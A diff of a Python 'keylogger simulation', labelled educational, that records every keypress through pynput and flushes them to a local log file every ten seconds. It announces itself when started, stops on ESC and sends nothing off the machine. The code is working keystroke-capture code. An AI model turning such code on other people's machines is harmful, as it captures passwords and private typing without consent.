@@ -1,8 +1,12 @@
-# src/keylogger_sim/keylogger.py
+#!/usr/bin/env python3
+"""
+Keylogger Simulation - Educational Purpose Only
+"""
 import threading
 import time
-from pynput import keyboard
 from datetime import datetime
+from pynput import keyboard
+import os
 
 class KeyLogger:
     def __init__(self, log_file="keystrokes.log"):
@@ -11,24 +15,26 @@ class KeyLogger:
         self.running = False
         self.listener = None
         
+        # Ensure log directory exists
+        os.makedirs(os.path.dirname(log_file) if os.path.dirname(log_file) else '.', exist_ok=True)
+        
     def start(self):
-        """Start the keylogger in a background thread"""
+        """Start the keylogger"""
         self.running = True
         self.listener = keyboard.Listener(
             on_press=self._on_press,
             on_release=self._on_release
         )
         self.listener.start()
-        # Auto-flush thread
         threading.Thread(target=self._auto_flush, daemon=True).start()
+        print("✅ Keylogger started. Press ESC to stop.")
         
     def _on_press(self, key):
-        """Callback for key press events"""
+        """Handle key press"""
         if not self.running:
             return False
             
         try:
-            # Handle special keys
             if hasattr(key, 'char') and key.char is not None:
                 keystroke = key.char
             else:
@@ -41,20 +47,20 @@ class KeyLogger:
             self.buffer.append(f"[ERROR] {str(e)}")
             
     def _on_release(self, key):
-        """Stop listener on ESC key"""
+        """Stop on ESC"""
         if key == keyboard.Key.esc:
             self.running = False
             self.flush()
             return False
             
     def _auto_flush(self):
-        """Periodically flush buffer to file"""
+        """Auto flush every 10 seconds"""
         while self.running:
-            time.sleep(10)  # Flush every 10 seconds
+            time.sleep(10)
             self.flush()
             
     def flush(self):
-        """Write buffer contents to log file"""
+        """Write buffer to file"""
         if not self.buffer:
             return
         with open(self.log_file, "a") as f:
@@ -62,17 +68,17 @@ class KeyLogger:
         self.buffer.clear()
         
     def stop(self):
-        """Stop the keylogger"""
+        """Stop keylogger"""
         self.running = False
         if self.listener:
             self.listener.stop()
         self.flush()
-        
-# Usage
+        print(" Keylogger stopped. Logs saved to", self.log_file)
+
 if __name__ == "__main__":
     logger = KeyLogger()
     logger.start()
-    print("Keylogger running... Press ESC to stop")
-    input()  # Wait for ESC
-    logger.stop()
-    print("Logs saved to keystrokes.log")
+    try:
+        input()  # Wait
+    except KeyboardInterrupt:
+        logger.stop()
